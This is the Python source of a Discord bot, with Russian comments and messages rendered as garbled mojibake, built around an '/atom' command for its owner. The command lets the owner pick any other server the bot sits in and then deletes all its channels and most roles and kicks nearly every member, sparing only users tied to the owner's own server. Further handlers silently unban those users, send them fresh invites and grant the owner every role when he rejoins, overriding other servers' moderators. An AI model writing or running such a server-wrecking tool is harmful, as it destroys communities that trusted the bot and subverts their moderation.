import discord
from discord.ext import commands
import asyncio

TOKEN = ''  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à —Ç–æ–∫–µ–Ω
AUTHORIZED_USER_ID =   # –í–∞—à ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
MAIN_SERVER_ID = 1225075859333845154
MAIN_VOICE_CHANNEL_ID = 1289694911234310155
PROTECTED_ROLES = {
    1289911579097436232,  # –ì—Ä–∞–∂–¥–∞–Ω—Å—Ç–≤–æ
    1289962005129859082,
    1225212269541986365,
    1364002544657109072,
    1226236176298541196
}

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.voice_states = True
intents.guilds = True

bot = commands.Bot(command_prefix='/', intents=intents)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
voice_client = None
current_page = 0
guilds_pages = []
is_performing_atom = False


async def play_music(channel, filename, loop=False):
    global voice_client
    if voice_client and voice_client.is_connected():
        await voice_client.disconnect()
    voice_client = await channel.connect()

    def after_playing(error):
        if loop and not error:
            asyncio.run_coroutine_threadsafe(play_music(channel, filename, loop), bot.loop)

    voice_client.play(discord.FFmpegPCMAudio(filename), after=after_playing)


async def stop_music():
    global voice_client
    if voice_client and voice_client.is_connected():
        await voice_client.disconnect()
        voice_client = None


async def send_dm(user, message):
    try:
        await user.send(message)
    except discord.Forbidden:
        print(f'–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –õ–° –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user.name}')


async def create_invite(guild):
    try:
        invite = await guild.text_channels[0].create_invite(max_age=300)
        return invite.url
    except:
        return "–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ"


async def has_protected_role(member):
    if member.guild.id != MAIN_SERVER_ID:
        main_guild = bot.get_guild(MAIN_SERVER_ID)
        if main_guild:
            main_member = main_guild.get_member(member.id)
            if main_member:
                return any(role.id in PROTECTED_ROLES for role in main_member.roles)
    return False


async def update_guilds_pages():
    global guilds_pages
    guilds = [g for g in bot.guilds if g.id != MAIN_SERVER_ID]
    guilds_pages = [guilds[i:i + 10] for i in range(0, len(guilds), 10)]


async def create_guild_embed(page):
    embed = discord.Embed(title=f"–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ä–≤–µ—Ä (–°—Ç—Ä–∞–Ω–∏—Ü–∞ {page + 1}/{len(guilds_pages)})")
    emoji_list = ['1Ô∏è‚É£', '2Ô∏è‚É£', '3Ô∏è‚É£', '4Ô∏è‚É£', '5Ô∏è‚É£', '6Ô∏è‚É£', '7Ô∏è‚É£', '8Ô∏è‚É£', '9Ô∏è‚É£', 'üîü']

    for i, guild in enumerate(guilds_pages[page]):
        embed.add_field(name=f'{emoji_list[i]} {guild.name}', value=f'ID: {guild.id}', inline=False)

    return embed, emoji_list[:len(guilds_pages[page])]


@bot.command()
async def atom(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return await ctx.send("‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω")

    if ctx.guild and ctx.guild.id == MAIN_SERVER_ID:
        return await ctx.send("‚ùå –ö–æ–º–∞–Ω–¥–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –Ω–∞ –æ—Å–Ω–æ–≤–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ")

    if not isinstance(ctx.channel, discord.DMChannel):
        return await ctx.send("‚ÑπÔ∏è –ö–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –ü—Ä–µ–∑–∏–¥–µ–Ω—Ç–∞ –í–û–°–¢–û–ß–ù–û–ì–û –§–†–û–ù–¢–ê")

    await handle_dm_atom(ctx)


async def handle_dm_atom(ctx):
    global current_page, is_performing_atom

    if is_performing_atom:
        return await ctx.send("‚ö†Ô∏è –ê—Ç–æ–º–Ω–∞—è –∞—Ç–∞–∫–∞ —É–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è")

    main_guild = bot.get_guild(MAIN_SERVER_ID)
    owner = main_guild.get_member(AUTHORIZED_USER_ID) if main_guild else None

    if owner:
        target_channel = owner.voice.channel if owner.voice else main_guild.get_channel(MAIN_VOICE_CHANNEL_ID)
        if target_channel:
            await play_music(target_channel, "wait.mp3", loop=True)

    await update_guilds_pages()

    if not guilds_pages:
        await ctx.send("‚ö†Ô∏è –ë–æ—Ç –Ω–µ —Å–æ—Å—Ç–æ–∏—Ç –≤ –¥—Ä—É–≥–∏—Ö —Å–µ—Ä–≤–µ—Ä–∞—Ö")
        await stop_music()
        return

    current_page = 0
    await send_guild_selection(ctx)


async def send_guild_selection(ctx):
    global current_page

    embed, emoji_list = await create_guild_embed(current_page)
    message = await ctx.send(embed=embed)

    for emoji in emoji_list:
        await message.add_reaction(emoji)

    if len(guilds_pages) > 1:
        await message.add_reaction('‚¨ÖÔ∏è')
        await message.add_reaction('‚û°Ô∏è')

    await message.add_reaction('‚ùå')

    def check(reaction, user):
        return (user == ctx.author and reaction.message.id == message.id and
                (reaction.emoji in emoji_list or reaction.emoji in ['‚¨ÖÔ∏è', '‚û°Ô∏è', '‚ùå']))

    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("‚åõ –í—Ä–µ–º—è –≤—ã–±–æ—Ä–∞ –∏—Å—Ç–µ–∫–ª–æ")
        await handle_timeout()
        return

    if reaction.emoji == '‚ùå':
        await ctx.send("‚ùå –ö–æ–º–∞–Ω–¥–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞")
        await handle_timeout()
        return

    if reaction.emoji == '‚¨ÖÔ∏è':
        current_page = max(0, current_page - 1)
        await message.delete()
        await send_guild_selection(ctx)
        return

    if reaction.emoji == '‚û°Ô∏è':
        current_page = min(len(guilds_pages) - 1, current_page + 1)
        await message.delete()
        await send_guild_selection(ctx)
        return

    index = emoji_list.index(reaction.emoji)
    selected_guild = guilds_pages[current_page][index]
    await message.delete()
    await confirm_action(ctx, selected_guild)


async def confirm_action(ctx, guild):
    confirm_msg = await ctx.send(
        f"–í—ã –≤—ã–±—Ä–∞–ª–∏: **{guild.name}**\n"
        "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:\n"
        "‚úÖ - –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å\n"
        "‚ùå - –û—Ç–º–µ–Ω–∏—Ç—å"
    )
    await confirm_msg.add_reaction('‚úÖ')
    await confirm_msg.add_reaction('‚ùå')

    def check(reaction, user):
        return user == ctx.author and reaction.message.id == confirm_msg.id and reaction.emoji in ['‚úÖ', '‚ùå']

    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("‚åõ –í—Ä–µ–º—è –∏—Å—Ç–µ–∫–ª–æ")
        await handle_timeout()
        return

    if reaction.emoji == '‚úÖ':
        await confirm_msg.delete()
        await execute_atom_attack(guild, ctx)
    else:
        await ctx.send("‚ùå –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ")
        await handle_timeout()


async def execute_atom_attack(guild, ctx):
    global is_performing_atom
    is_performing_atom = True

    try:
        await stop_music()
        main_guild = bot.get_guild(MAIN_SERVER_ID)
        if main_guild:
            target_channel = main_guild.get_channel(MAIN_VOICE_CHANNEL_ID)
            if target_channel:
                await play_music(target_channel, "pusk.mp3")

        # 15-—Å–µ–∫—É–Ω–¥–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º
        await ctx.send(f"‚è≥ –ù–∞—á–∏–Ω–∞—é –∞—Ç–æ–º–Ω—É—é –∞—Ç–∞–∫—É –Ω–∞ **{guild.name}** —á–µ—Ä–µ–∑ 15 —Å–µ–∫—É–Ω–¥...")
        await asyncio.sleep(15)

        await perform_atom(guild)

        # –ñ–¥—ë–º –æ–∫–æ–Ω—á–∞–Ω–∏—è –º—É–∑—ã–∫–∏ + 5 —Å–µ–∫—É–Ω–¥
        while voice_client and voice_client.is_playing():
            await asyncio.sleep(1)

        await asyncio.sleep(5)
        await stop_music()

        await ctx.send(f"‚ò¢Ô∏è –ê—Ç–æ–º–Ω–∞—è –∞—Ç–∞–∫–∞ –Ω–∞ **{guild.name}** –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
    except Exception as e:
        await ctx.send(f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}")
    finally:
        is_performing_atom = False


async def handle_timeout():
    await stop_music()
    main_guild = bot.get_guild(MAIN_SERVER_ID)
    if main_guild:
        target_channel = main_guild.get_channel(MAIN_VOICE_CHANNEL_ID)
        if target_channel:
            await play_music(target_channel, "otmena.mp3")
            await asyncio.sleep(5)
            await stop_music()


async def perform_atom(guild):
    protected_members = []
    protected_bots = []

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤
    for member in guild.members:
        if await has_protected_role(member):
            if member.bot:
                protected_bots.append(member)
            else:
                protected_members.append(member)

    # –£–¥–∞–ª–µ–Ω–∏–µ –∫–∞–Ω–∞–ª–æ–≤
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f'–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –∫–∞–Ω–∞–ª–∞: {e}')

    # –£–¥–∞–ª–µ–Ω–∏–µ —Ä–æ–ª–µ–π
    for role in guild.roles:
        try:
            if role.name != "@everyone" and not role.managed:
                # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –∑–∞—â–∏—â–µ–Ω–Ω—ã–µ –±–æ—Ç—ã
                protected_role = False
                for bot_member in protected_bots:
                    if role in bot_member.roles:
                        protected_role = True
                        break

                if not protected_role:
                    await role.delete()
                    await asyncio.sleep(0.5)
        except Exception as e:
            print(f'–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è —Ä–æ–ª–∏: {e}')

    # –ö–∏–∫ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤
    for member in guild.members:
        if member not in protected_members and member not in protected_bots:
            try:
                await member.kick(reason="–ê—Ç–æ–º–Ω–∞—è –∞—Ç–∞–∫–∞")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f'–û—à–∏–±–∫–∞ –∫–∏–∫–∞ —É—á–∞—Å—Ç–Ω–∏–∫–∞: {e}')


@bot.event
async def on_member_join(member):
    if member.id == AUTHORIZED_USER_ID:
        roles = [role for role in member.guild.roles if role.name != "@everyone"]
        roles = [role for role in roles if role.position < member.guild.me.top_role.position]
        try:
            await member.edit(roles=roles)
            await send_dm(member, f'üîô –í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä! –í–∞–º –≤—ã–¥–∞–Ω—ã –≤—Å–µ —Ä–æ–ª–∏.')
        except Exception as e:
            print(f'–û—à–∏–±–∫–∞ –≤—ã–¥–∞—á–∏ —Ä–æ–ª–µ–π: {e}')


@bot.event
async def on_member_remove(member):
    """–°—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç, –∫–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∫–∏–∫–Ω—É–ª–∏ –∏–ª–∏ –æ–Ω –≤—ã—à–µ–ª"""
    if not await has_protected_role(member):
        return

    try:
        # –ü—ã—Ç–∞–µ–º—Å—è —Å–æ–∑–¥–∞—Ç—å –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ
        invite = await member.guild.text_channels[0].create_invite(
            max_age=86400,  # –°—Å—ã–ª–∫–∞ –Ω–∞ 24 —á–∞—Å–∞
            reason="–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ –¥–ª—è –∑–∞—â–∏—â–µ–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"
        )

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ –õ–°
        await send_dm(
            member,
            f"‚ö†Ô∏è –í–∞—Å –∏—Å–∫–ª—é—á–∏–ª–∏ —Å —Å–µ—Ä–≤–µ—Ä–∞ **{member.guild.name}**\n"
            f"üîó –í–æ—Ç —Å—Å—ã–ª–∫–∞ –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞: {invite.url}\n"
            f"–°–≤–æ–∏—Ö –Ω–µ –±—Ä–æ—Å–∞–µ–º!"
        )

    except Exception as e:
        print(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ {member.name}: {e}")


@bot.event
async def on_member_ban(guild, user):
    """–°—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –ø—Ä–∏ –±–∞–Ω–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    if guild.id == MAIN_SERVER_ID:
        return

    if not await has_protected_role(user):
        return

    try:
        # –†–∞–∑–±–∞–Ω–∏–≤–∞–µ–º
        await guild.unban(user)

        # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤–æ–µ –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ
        invite = await guild.text_channels[0].create_invite(
            max_age=86400,
            reason="–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ä–∞–∑–±–∞–Ω –∑–∞—â–∏—â–µ–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"
        )

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ –õ–°
        await send_dm(
            user,
            f"üîì –í–∞—Å —Ä–∞–∑–±–∞–Ω–∏–ª–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ **{guild.name}**\n"
            f"üîó –í–æ—Ç –Ω–æ–≤–∞—è —Å—Å—ã–ª–∫–∞ –¥–ª—è –≤—Ö–æ–¥–∞: {invite.url}\n"
            f"–°–≤–æ–∏—Ö –Ω–µ –±—Ä–æ—Å–∞–µ–º!"
        )

        # –£–≤–µ–¥–æ–º–ª—è–µ–º –≤–ª–∞–¥–µ–ª—å—Ü–∞
        owner = bot.get_user(AUTHORIZED_USER_ID)
        if owner:
            await send_dm(
                owner,
                f"üõ°Ô∏è –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ä–∞–∑–±–∞–Ω:\n"
                f"‚Ä¢ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user.name} (ID: {user.id})\n"
                f"‚Ä¢ –°–µ—Ä–≤–µ—Ä: {guild.name}"
            )

    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Ä–∞–∑–±–∞–Ω–∞ {user.name}: {e}")
        owner = bot.get_user(AUTHORIZED_USER_ID)
        if owner:
            await send_dm(
                owner,
                f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞–∑–±–∞–Ω–∏—Ç—å {user.name}:\n"
                f"‚Ä¢ –û—à–∏–±–∫–∞: {str(e)}"
            )


@bot.event
async def on_ready():
    print(f'–ë–æ—Ç {bot.user.name} –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ')
    await bot.change_presence(activity=discord.Game(name="/atom"))


bot.run(TOKEN)